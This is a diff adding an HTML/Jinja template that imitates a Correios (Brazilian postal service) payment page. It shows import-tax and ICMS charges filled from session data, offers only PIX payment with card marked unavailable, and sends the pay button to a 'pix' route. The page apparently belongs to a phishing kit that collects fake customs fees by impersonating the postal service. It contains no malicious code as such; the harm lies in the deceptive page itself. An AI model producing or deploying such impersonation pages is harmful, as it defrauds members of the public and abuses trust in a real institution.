@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Card Futurístico</title>
+    <link rel="shortcut icon" href="/ect/img/favi-ect.png" type="image/x-icon">
+    <link rel="stylesheet" href="/ect/css/bunker.css" type="text/css">
+    <link rel="stylesheet" href="/ect/css/global5e1f.css?v=2" type="text/css">
+    <link rel="stylesheet" href="/ect/loginform.css" type="text/css">
+    <style>
+        body {
+            font-family: Arial, sans-serif; 
+            margin: 0;
+            padding: 0; 
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .card { 
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 11px;
+            color: #e0e0e0;
+            text-align: center; 
+        }
+        .card h2 {
+            margin: 0;
+            font-size: 24px;
+            color: #00416b; /* Title color using an existing color */
+        }
+        .card p {
+            margin: 10px 0;
+            font-size: 18px;
+            line-height: 1.6;
+        }
+        .card p span {
+            font-weight: bold;
+            color: #00416b; /* Text highlight color using an existing color */
+        }
+        .info-box {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            background-color: #1a1a1a;
+            border-radius: 10px;
+            padding: 10px;
+            border: 1px solid #00e5ff;
+            position: relative;
+        }
+        .info-box .unavailable {
+            position: absolute;
+            top: 20px;
+            left: 76px;
+            background-color: #ff4d4d; /* Background color for the unavailable label */
+            color: #fff;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .info-image {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            object-fit: cover;
+            margin-right: 10px;
+        }
+        .info-box-content {
+            display: flex;
+            flex-direction: column;
+        }
+        .info-item {
+            color: #e0e0e0;
+            font-size: 16px;
+        }
+        .botoes {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .botoes .primarios {
+            width: 100%;
+            padding: 10px;
+            background-color: #0071ad;
+            font-size: 16px; 
+            border: none;
+            color: #fffdfd;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .botoes .primario:hover {
+            color: #fff;
+    background-color: #007bff;
+    border-color: #007bff;
+        }
+        
+    </style>
+</head>
+<body class="login mdc-typography">
+<section id="acessibilidade">
+        <a tabindex="1">Acessibilidade</a> 
+    </section>
+    <div id="acess-drop-down">
+        <header>
+            <a class="close" tabindex="1"></a>
+        </header>
+    </div>
+<section id="menu">
+    <a class="hamburger" tabindex="1"></a>
+    <a class="logo" href="#"></a>
+    <a class="pesquisar"></a>
+    <div class="menu oculto">
+        <section>
+            <h1>Correios - CAS</h1>
+        </section>
+        <a href="/">Problemas para acessar o Meu Correios?</a>
+        <a href="/">Sair</a>
+    </div>
+</section>
+<main role="main">
+
+    <div id="content" class="ctn-tabela">
+        
+        <div>
+            <section id="loginForm">
+                <section>
+                    <div class="container">
+                        <div class="card">
+                            <h2>Detalhes do Pagamento</h2>
+                            <p><span>Imposto de importação:</span> R$ {{session['taxas']['imposto']}}</p>
+                            <p><span>ICMS:</span> R$ {{session['taxas']['icms']}}</p>
+                            <p><span>Despacho postal:</span> R$ 0,00</p>
+                            <p><span>Multa:</span> R$ 0,00</p>
+                            <p><span>Valor Complementar:</span> R$ 0,00</p>
+                            <p><span>Valor Total:</span> R$ {{session['taxas']['valor']}}</p>
+                            
+                            <div class="info-box">
+                                <img alt="svgImg" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCI+CjxwYXRoIGZpbGw9IiM0ZGI2YWMiIGQ9Ik0xMS45LDEyaC0wLjY4bDguMDQtOC4wNGMyLjYyLTIuNjEsNi44Ni0yLjYxLDkuNDgsMEwzNi43OCwxMkgzNi4xYy0xLjYsMC0zLjExLDAuNjItNC4yNCwxLjc2CWwtNi44LDYuNzdjLTAuNTksMC41OS0xLjUzLDAuNTktMi4xMiwwbC02LjgtNi43N0MxNS4wMSwxMi42MiwxMy41LDEyLDExLjksMTJ6Ij48L3BhdGg+PHBhdGggZmlsbD0iIzRkYjZhYyIgZD0iTTM2LjEsMzZoMC42OGwtOC4wNCw4LjA0Yy0yLjYyLDIuNjEtNi44NiwyLjYxLTkuNDgsMEwxMS4yMiwzNmgwLjY4YzEuNiwwLDMuMTEtMC42Miw0LjI0LTEuNzYJbDYuOC02Ljc3YzAuNTktMC41OSwxLjUzLTAuNTksMi4xMiwwbDYuOCw2Ljc3QzMyLjk5LDM1LjM4LDM0LjUsMzYsMzYuMSwzNnoiPjwvcGF0aD48cGF0aCBmaWxsPSIjNGRiNmFjIiBkPSJNNDQuMDQsMjguNzRMMzguNzgsMzRIMzYuMWMtMS4wNywwLTIuMDctMC40Mi0yLjgzLTEuMTdsLTYuOC02Ljc4Yy0xLjM2LTEuMzYtMy41OC0xLjM2LTQuOTQsMAlsLTYuOCw2Ljc4QzEzLjk3LDMzLjU4LDEyLjk3LDM0LDExLjksMzRIOS4yMmwtNS4yNi01LjI2Yy0yLjYxLTIuNjItMi42MS02Ljg2LDAtOS40OEw5LjIyLDE0aDIuNjhjMS4wNywwLDIuMDcsMC40MiwyLjgzLDEuMTcJbDYuOCw2Ljc4YzAuNjgsMC42OCwxLjU4LDEuMDIsMi40NywxLjAyczEuNzktMC4zNCwyLjQ3LTEuMDJsNi44LTYuNzhDMzQuMDMsMTQuNDIsMzUuMDMsMTQsMzYuMSwxNGgyLjY4bDUuMjYsNS4yNglDNDYuNjUsMjEuODgsNDYuNjUsMjYuMTIsNDQuMDQsMjguNzR6Ij48L3BhdGg+Cjwvc3ZnPg==" alt="Pix" class="info-image">
+                                <div class="info-box-content">
+                                    <div class="info-item">Pagamento via PIX</div>
+                                </div>
+                            </div>
+                            
+                            <div class="info-box">
+                                <div class="unavailable">Indisponível</div>
+                                <img width="50" height="50" src="https://img.icons8.com/isometric/50/bank-card-back-side.png" alt="Cartão" class="info-image">
+                                <div class="info-box-content">
+                                    <div class="info-item">Pagamento com Cartão</div>
+                                </div>
+                            </div>
+                            
+                           
+                        </div>
+                        <br>
+                        <div class="botoes">
+                                <button type="button" id="b-pesquisar" name="b-pesquisar" class="primarios">Efetuar Pagamento</button>
+                            </div>
+                    </div>
+                </section>
+            </section>
+        </div>
+    </div> 
+</main>
+
+<script src="/ect/js/menu.js"></script>
+<script type="text/javascript" src="/webjars/jquery/3.6.1/jquery.min.js"></script>
+<script>
+document.getElementById('b-pesquisar').addEventListener('click', function() {
+    window.location.href = 'pix';
+});
+</script>
+</body>
+</html>
